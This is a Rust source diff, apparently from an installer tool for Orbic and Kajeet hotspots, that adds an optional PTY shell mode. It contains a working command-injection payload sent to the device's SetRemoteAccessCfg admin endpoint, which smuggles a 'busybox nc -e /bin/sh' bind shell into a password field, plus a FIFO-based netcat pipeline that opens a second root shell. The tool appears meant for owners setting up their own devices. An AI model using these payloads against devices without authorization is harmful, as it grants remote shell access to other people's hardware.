@@ -9,11 +9,47 @@ use tokio::time::sleep;
 
 use crate::orbic_auth::{LoginInfo, LoginRequest, LoginResponse, encode_password};
 use crate::output::{eprintln, print, println};
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::net::TcpStream;
+
 use crate::util::{interactive_shell, telnet_send_command, telnet_send_file};
 use crate::{CONFIG_TOML, RAYHUNTER_DAEMON_INIT};
 
 // Some kajeet devices have password protected telnetd on port 23, so we use port 24 just in case
 const TELNET_PORT: u16 = 24;
+
+/// Build the shell command to start a PTY shell on a given port.
+/// This is sent through an existing shell connection (not via HTTP exploit).
+fn pty_start_command(port: u16) -> String {
+    // Start a PTY-enabled shell on the specified port.
+    // Uses a subshell with redirected stdin/stdout/stderr to ensure the process
+    // survives after the parent shell exits.
+    // Note: BusyBox nc doesn't reliably re-listen after a connection closes,
+    // so this shell only supports one connection. Users should use --no-pty for
+    // programmatic access that requires reconnection.
+    //
+    // The key trick is `exec 3<>/tmp/f` which opens the FIFO in read-write mode
+    // BEFORE the pipeline starts. This prevents a deadlock where:
+    //   - cat blocks waiting for a writer to open the FIFO
+    //   - script can't start because the pipeline is blocked
+    //
+    // Data flow:
+    //   Network input -> nc stdout -> script stdin -> PTY master -> shell
+    //   Shell output -> PTY slave -> script stdout -> FIFO (fd 3) -> cat -> nc stdin -> Network
+    //
+    // First, kill any stale PTY processes that might be holding onto the FIFO from
+    // a previous failed attempt. We kill cat and script processes - these are unlikely
+    // to be running for other purposes on this embedded device.
+    // The echo at the end confirms the command was processed.
+    format!(
+        "killall cat script 2>/dev/null; rm -f /tmp/f; mkfifo /tmp/f; (exec 3<>/tmp/f; cat <&3 | busybox nc -l -p {port} | script -q -c /bin/sh /dev/null >&3) </dev/null >/dev/null 2>&1 &\necho PTY_STARTED"
+    )
+}
+
+/// Build the command injection payload for legacy shell (no PTY).
+fn legacy_shell_command(port: u16) -> String {
+    format!(r#"{{"password": "\"; busybox nc -ll -p {port} -e /bin/sh & #"}}"#)
+}
 
 #[derive(Deserialize, Debug)]
 struct ExploitResponse {
@@ -100,14 +136,15 @@ async fn login_and_exploit(admin_ip: &str, username: &str, password: &str) -> Re
     }
 
     // Step 4: Exploit using authenticated session
+    // Original Orbic lacks telnetd (kajeet has it) so we need to use netcat
+    // Note: We always start with legacy shell here because the HTTP exploit
+    // filters < and > characters, which prevents the PTY command from working.
+    // PTY mode is enabled later via telnet_send_command if needed.
     let response: ExploitResponse = client
         .post(format!("http://{}/action/SetRemoteAccessCfg", admin_ip))
         .header("Content-Type", "application/json")
         .header("Cookie", authenticated_cookie)
-        // Original Orbic lacks telnetd (kajeet has it) so we need to use netcat
-        .body(format!(
-            r#"{{"password": "\"; busybox nc -ll -p {TELNET_PORT} -e /bin/sh & #"}}"#
-        ))
+        .body(legacy_shell_command(TELNET_PORT))
         .send()
         .await
         .context("failed to start telnet")?
@@ -134,6 +171,73 @@ pub async fn start_telnet(
     print!("Logging in and starting telnet... ");
     login_and_exploit(admin_ip, admin_username, admin_password).await?;
     println!("done");
+
+    Ok(())
+}
+
+// Port for PTY shell (different from legacy to avoid conflicts)
+const PTY_PORT: u16 = 25;
+
+/// Upgrade an existing legacy shell to PTY mode.
+/// Starts PTY shell on a different port via the legacy shell connection.
+async fn upgrade_to_pty(admin_ip: &str) -> Result<()> {
+    let legacy_addr = SocketAddr::from_str(&format!("{admin_ip}:{TELNET_PORT}"))?;
+
+    // Wait for the legacy shell to be available
+    let timeout_duration = Duration::from_secs(10);
+    let start_time = std::time::Instant::now();
+    while telnet_send_command(legacy_addr, "true", "exit code 0", false)
+        .await
+        .is_err()
+    {
+        if start_time.elapsed() >= timeout_duration {
+            bail!("Timeout waiting for shell to become available");
+        }
+        sleep(Duration::from_millis(500)).await;
+    }
+
+    // Start PTY shell on the PTY port via the legacy shell.
+    // Send the command directly without the echo suffix that telnet_send_command adds,
+    // since that can interfere with backgrounded commands.
+    let start_cmd = pty_start_command(PTY_PORT);
+    let mut stream = TcpStream::connect(legacy_addr).await?;
+    stream.write_all(start_cmd.as_bytes()).await?;
+    stream.write_all(b"\n").await?;
+
+    // Wait for PTY_STARTED marker to confirm the command was processed
+    let mut buf = vec![0u8; 1024];
+    let mut total_read = 0;
+    let timeout_duration = Duration::from_secs(10);
+    let start_time = std::time::Instant::now();
+
+    loop {
+        if start_time.elapsed() >= timeout_duration {
+            bail!("Timeout waiting for PTY shell to start");
+        }
+
+        match tokio::time::timeout(Duration::from_secs(1), stream.read(&mut buf[total_read..]))
+            .await
+        {
+            Ok(Ok(0)) => break, // Connection closed
+            Ok(Ok(n)) => {
+                total_read += n;
+                let output = String::from_utf8_lossy(&buf[..total_read]);
+                if output.contains("PTY_STARTED") {
+                    break;
+                }
+            }
+            Ok(Err(e)) => {
+                bail!("Error reading from shell: {}", e);
+            }
+            Err(_) => continue, // Timeout, try again
+        }
+    }
+    drop(stream);
+
+    // Wait for the PTY shell to start listening.
+    // Note: We don't verify by connecting because BusyBox nc only accepts one connection,
+    // and we want the interactive_shell to be that connection.
+    sleep(Duration::from_secs(2)).await;
 
     Ok(())
 }
@@ -279,10 +383,24 @@ pub async fn shell(
     admin_ip: &str,
     admin_username: &str,
     admin_password: Option<&str>,
+    use_pty: bool,
 ) -> Result<()> {
+    // Start with legacy shell (PTY can't be started via HTTP exploit due to character filtering)
     start_telnet(admin_ip, admin_username, admin_password).await?;
-    eprintln!(
-        "This terminal is fairly limited. The shell prompt may not be visible, but it still accepts commands."
-    );
-    interactive_shell(admin_ip, TELNET_PORT, false).await
+
+    let shell_port = if use_pty {
+        // Upgrade to PTY mode by sending upgrade command through the legacy shell
+        print!("Upgrading to PTY mode... ");
+        upgrade_to_pty(admin_ip).await?;
+        println!("done");
+        eprintln!("Connected to PTY shell. Press Ctrl+D or type 'exit' to disconnect.");
+        PTY_PORT
+    } else {
+        eprintln!(
+            "Connected (legacy mode). Shell prompt may not be visible, but commands work."
+        );
+        TELNET_PORT
+    };
+    // raw_mode on client should match use_pty for proper key forwarding
+    interactive_shell(admin_ip, shell_port, use_pty).await
 }
